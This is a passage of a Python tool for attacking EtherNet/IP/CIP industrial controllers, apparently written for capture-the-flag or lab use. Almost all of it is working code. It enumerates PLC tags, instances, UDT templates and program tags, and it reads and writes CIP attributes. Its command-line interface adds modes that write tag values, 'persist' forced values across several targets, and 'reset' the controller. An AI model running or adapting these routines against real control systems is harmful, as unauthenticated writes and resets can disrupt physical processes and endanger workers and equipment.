        from pycomm3 import CIPDriver
        path = "{}:{}".format(host, port)
        print(info("CIPDriver path: " + path))
        with CIPDriver(path) as d:
            print(ok("CIPDriver connected"))
            for inst in range(1, max_inst):
                try:
                    # --- exact same as cip.py ---
                    response = d.generic_message(
                        service=0x0E,
                        class_code=0x6B,
                        instance=inst,
                        attribute=1
                    )
                    if getattr(response, "error", None):
                        continue
                    name = _decode_cip_name(response.value)
                    if not name:
                        continue
                    # --- end cip.py logic ---
                    if name_filter is None or name_filter.lower() in name.lower():
                        found.append({'instance': inst, 'name': name, 'type': 'tag'})
                        print("  " + green("[+]") + " inst={:03d}: ".format(inst) + bold(name))
                except Exception:
                    continue
        return found, True
    except Exception as e:
        print(warn("CIPDriver error: " + str(e)))
        return [], False


def _enum_symbols_raw(host, port, name_filter=None, max_inst=200):
    """Raw socket fallback — Get_Attribute_Single service=0x0E class=0x6B attr=1"""
    found = []
    type_map = {
        0xC1:"BOOL", 0xC2:"SINT", 0xC3:"INT", 0xC4:"DINT",
        0xC7:"UINT", 0xC8:"UDINT", 0xCA:"REAL", 0xDA:"STRING",
    }
    t = ENIPTransport(host, port)
    if not t.connect():
        print(err("Raw fallback connection failed"))
        return found
    for instance in range(1, max_inst):
        path = bytes([0x20, 0x6B, 0x24, instance & 0xFF, 0x30, 0x01])
        cip  = bytes([0x0E, len(path)//2]) + path
        pkt  = _wrap_cip_in_enip(t.session, cip)
        try:
            t.sock.send(pkt)
            resp = t.sock.recv(1024)
            gs, data = _parse_enip_response(resp)
            if gs == 0 and data:
                name = _decode_symbol_name(data)
                if name:
                    # get type
                    path2 = bytes([0x20, 0x6B, 0x24, instance & 0xFF, 0x30, 0x02])
                    cip2  = bytes([0x0E, len(path2)//2]) + path2
                    t.sock.send(_wrap_cip_in_enip(t.session, cip2))
                    r2 = t.sock.recv(512)
                    gs2, d2 = _parse_enip_response(r2)
                    type_name = "unknown"
                    if gs2 == 0 and d2 and len(d2) >= 2:
                        sym_type = struct.unpack('<H', d2[:2])[0]
                        base = sym_type & 0x00FF
                        type_name = type_map.get(base, "0x{:02X}".format(base))
                    if name_filter is None or name_filter.lower() in name.lower():
                        found.append({'instance': instance, 'name': name, 'type': type_name})
            elif gs in (0x08, 0x05):
                break
        except Exception:
            break
    t.disconnect()
    return found


def mode_cip(host, port, action="symbol", scope="controller",
             name_filter=None, class_id=None, instance=1,
             attr=None, value=None, class_start=1, class_end=100):
    print("\n" + bold(blue('[*]')) + " " + cyan('CIP') + " — " + bold(host) + "  action=" + bold(action))
    SEP = "─" * 65
    print(SEP)

    # ── action: symbol ────────────────────────────────────────────
    if action in ("symbol", "all"):
        print("\n" + bold('[ Symbol/Tag Enumeration ]'))
        print(info("Scope: " + scope + "  Filter: " + str(name_filter or 'none')))

        # Try CIPDriver first (best — same as cip.py that works)
        found = []
        if PYCOMM3_OK:
            print(info("Using CIPDriver (pycomm3)..."))
            found, ok_flag = _enum_symbols_cipdriver(host, port, name_filter, max_inst=200)
            if ok_flag:
                print(ok("CIPDriver connected: {}:{}".format(host, port)))
            else:
                print(warn("CIPDriver failed — trying raw socket..."))

        if not found:
            print(info("Raw socket fallback (service=0x0E, class=0x6B, attr=1)..."))
            found = _enum_symbols_raw(host, port, name_filter, max_inst=200)

        print("\n  " + "Inst".rjust(6) + " | " + "Tag Name".ljust(35) + " | " + "Type".ljust(12))
        print("  " + "─" * 65)
        for sym in found:
            print("  " + str(sym['instance']).rjust(6) + " | " + bold(sym['name']).ljust(40) + " | " + cyan(sym['type']))
        print("\n" + ok("Found " + str(len(found)) + " symbols"))
        if name_filter and found:
            print("\n" + ok("Matches for '" + name_filter + "':"))
            for m in found:
                print("  " + red('[MATCH]') + " inst=" + str(m['instance']) + " " + bold(m['name']) + " type=" + m['type'])

    # ── action: instance ──────────────────────────────────────────
    if action in ("instance", "all"):
        cid = class_id or 0x6B
        class_name = CIP_CLASSES.get(cid, "0x{:02X}".format(cid))
        print("\n" + bold("[ Instance Enumeration ]") + " class=" + cyan(class_name))
        t = ENIPTransport(host, port)
        if not t.connect():
            print(err("Connection failed"))
            return
        print("  " + "Inst".rjust(6) + " | " + "Status".ljust(8) + " | Data preview")
        print("  " + "─" * 55)
        found_inst = []
        for inst in range(1, 65536):
            status, data = t.get_attr_all(cid, inst)
            if status is None:
                break
            if status == 0:
                preview = data.hex()[:20] if data else ""
                print("  " + str(inst).rjust(6) + " | " + green('OK').ljust(12) + " | " + neon(preview))
                found_inst.append(inst)
            elif status in (0x08, 0x05):
                break
        print("\n" + ok("Found " + str(len(found_inst)) + " instances"))
        t.disconnect()

    # ── action: template ──────────────────────────────────────────
    if action in ("template", "all"):
        print("\n" + bold("[ Template/UDT Enumeration ]") + " (class=0xF0)")
        t = ENIPTransport(host, port)
        if not t.connect():
            print(err("Connection failed"))
            return
        print("  " + "ID".rjust(6) + " | " + "UDT Name".ljust(25) + " | Members")
        print("  " + "─" * 55)
        for tid in range(1, 200):
            status, data = t.get_attr(0xF0, tid, 1)
            if status is None:
                break
            if status == 0 and data:
                try:
                    name_len = data[0]
                    name = data[1:1+name_len].decode(errors='ignore')
                    print("  " + str(tid).rjust(6) + " | " + bold(name).ljust(30) + " | (enum members with --action template)")
                except Exception:
                    pass
            elif status in (0x08, 0x05):
                break
        t.disconnect()

    # ── action: program ───────────────────────────────────────────
    if action in ("program", "all"):
        print("\n" + bold("[ Program Scope Tags ]"))
        if PYCOMM3_OK:
            try:
                from pycomm3 import LogixDriver
                with LogixDriver(host) as plc:
                    programs = plc.programs or []
                    if programs:
                        print(ok("Programs: " + str(programs)))
                        for prog in programs:
                            tags = plc.get_tag_list(program=prog) or []
                            print("\n  " + bold(blue("[ " + prog + " ]")) + " — " + str(len(tags)) + " tags")
                            for tag in tags:
                                n = tag.tag_name
                                if name_filter and name_filter.lower() not in n.lower():
                                    continue
                                print("    " + bold(n) + " : " + cyan(str(tag.data_type)))
                    else:
                        print(warn("No programs found"))
            except Exception as e:
                print(err("pycomm3 failed: " + str(e)))
        else:
            print(warn("Program scope requires pycomm3: pip install pycomm3"))

    # ── action: read ──────────────────────────────────────────────
    if action == "read":
        if class_id is None:
            print(err("--class required"))
            return
        t = ENIPTransport(host, port)
        if not t.connect():
            print(err("Connection failed"))
            return
        if attr is not None:
            status, data = t.get_attr(class_id, instance, attr)
        else:
            status, data = t.get_attr_all(class_id, instance)
        t.disconnect()
        if status == 0 and data:
            print(ok("class=0x{:02X} inst={} attr={}".format(class_id, instance, attr)))
            print(ok("Raw:  " + neon(data.hex())))
            try:
                as_int = struct.unpack('<I', data[:4])[0]
                print(ok("INT:  " + neon(str(as_int))))
            except Exception:
                pass
        else:
            print(err("Status: " + ("0x{:02X}".format(status) if status is not None else "No response")))

    # ── action: write ─────────────────────────────────────────────
    if action == "write":
        if class_id is None or attr is None or value is None:
            print(err("--class --attr --value required"))
            return
        t = ENIPTransport(host, port)
        if not t.connect():
            print(err("Connection failed"))
            return
        try:
            vb = struct.pack('<I', int(value))
        except Exception:
            vb = str(value).encode()
        s0, before = t.get_attr(class_id, instance, attr)
        print("  Before: " + yellow(before.hex() if before else 'N/A'))
        status, _ = t.set_attr(class_id, instance, attr, vb)
        s1, after = t.get_attr(class_id, instance, attr)
        print("  After:  " + neon(after.hex() if after else 'N/A'))
        status_str = green('OK') if status == 0 else red("FAILED 0x{:02X}".format(status) if status else "FAILED")
        print(ok("Write " + status_str))
        t.disconnect()

# ════════════════════════════════════════════════════════════════
# CLI
# ════════════════════════════════════════════════════════════════

def parse_hex(s):
    try:
        return int(s, 16) if s.startswith('0x') else int(s)
    except:
        return None

def parse_args():
    p = argparse.ArgumentParser(add_help=False)
    p.add_argument("host",        nargs="?")
    p.add_argument("-h","--help", action="store_true")
    p.add_argument("-m","--mode", default="info",
        choices=["info","enum","symbol","cip","read","write","monitor","persist","reset","forward"])
    p.add_argument("-p","--port", type=int, default=ENIP_PORT)
    p.add_argument("--class",     dest="class_id", default=None)
    p.add_argument("--instance",  type=int, default=1)
    p.add_argument("--attr",      type=int, default=None)
    p.add_argument("--tag",       default=None)
    p.add_argument("--tags",      default=None, help="Comma-separated tag names")
    p.add_argument("--value",     default=None)
    p.add_argument("--interval",  type=float, default=2.0)
    p.add_argument("--timeout",   type=float, default=0)
    p.add_argument("--class-start", type=int, default=1)
    p.add_argument("--class-end",   type=int, default=100)
    p.add_argument("--action",  default="symbol",
        choices=["symbol","read","write","template","program","instance","all"],
        help="CIP sub-action (used with -m cip)")
    p.add_argument("--scope",   default="controller",
        help="Tag scope: controller / program:<name> / all")
    p.add_argument("--filter",  default=None,
        help="Filter tag names containing this string e.g. --filter flag")

    args, remainder = p.parse_known_args()

    if args.help or not args.host:
        print(BANNER)
        print(HELP)
        sys.exit(0)

    # parse class_id
    if args.class_id:
        args.class_id = parse_hex(args.class_id)

    return args, remainder

def split_targets(argv):
    """Split by ':' separator"""
    groups, cur = [], []
    for a in argv:
        if a == ':':
            if cur: groups.append(cur)
            cur = []
        else:
            cur.append(a)
    if cur: groups.append(cur)
    return groups if groups else [argv]

def main():
    args, remainder = parse_args()
    print(BANNER)
    print(f"{info(f'Target: {bold(args.host)}:{args.port}')}")
    print(f"{info(f'Mode:   {bold(args.mode)}')}")
    pycomm3_status = green("available") if PYCOMM3_OK else yellow("not installed — raw fallback")
    print(info(f"pycomm3: {pycomm3_status}"))

    if args.mode == "info":
        mode_info(args.host, args.port)

    elif args.mode == "enum":
        mode_enum(args.host, args.port, args.class_start, args.class_end)

    elif args.mode in ("symbol", "cip"):
        mode_cip(args.host, args.port,
                 action  = args.action if args.mode == "cip" else "symbol",
                 scope   = args.scope,
                 name_filter = args.filter,
                 class_id    = args.class_id,
                 instance    = args.instance,
                 attr        = args.attr,
                 value       = args.value,
                 class_start = args.class_start,
                 class_end   = args.class_end)

    elif args.mode == "read":
        mode_read(args.host, args.port,
                  class_id=args.class_id,
                  instance=args.instance,
                  attr=args.attr,
                  tag=args.tag)

    elif args.mode == "write":
        if args.value is None:
            print(err("--value required")); sys.exit(1)
        mode_write(args.host, args.port,
                   class_id=args.class_id,
                   instance=args.instance,
                   attr=args.attr,
                   tag=args.tag,
                   value=args.value)

    elif args.mode == "monitor":
        tags = [t.strip() for t in args.tags.split(',')] if args.tags else \
               ([args.tag] if args.tag else None)
        mode_monitor(args.host, args.port,
                     tags=tags,
                     interval=args.interval)

    elif args.mode == "persist":
        # parse multi-target with : separator
        all_args = []
        if args.tag:   all_args += ["--tag", args.tag]
        if args.value: all_args += ["--value", args.value]
        all_args += remainder

        groups  = split_targets(all_args)
        targets = []
        for g in groups:
            sub = argparse.ArgumentParser(add_help=False)
            sub.add_argument("--tag",   default=None)
            sub.add_argument("--value", default=None)
            sub.add_argument("--class", dest="class_id", default=None)
            sub.add_argument("--instance", type=int, default=1)
            sub.add_argument("--attr",  type=int, default=None)
            sa, _ = sub.parse_known_args(g)
            if sa.tag and sa.value:
                targets.append((sa.tag, sa.value))

        mode_persist(args.host, args.port, targets,
                     interval=args.interval,
                     timeout_min=args.timeout)

    elif args.mode == "reset":
        mode_reset(args.host, args.port)


if __name__ == "__main__":
    main()
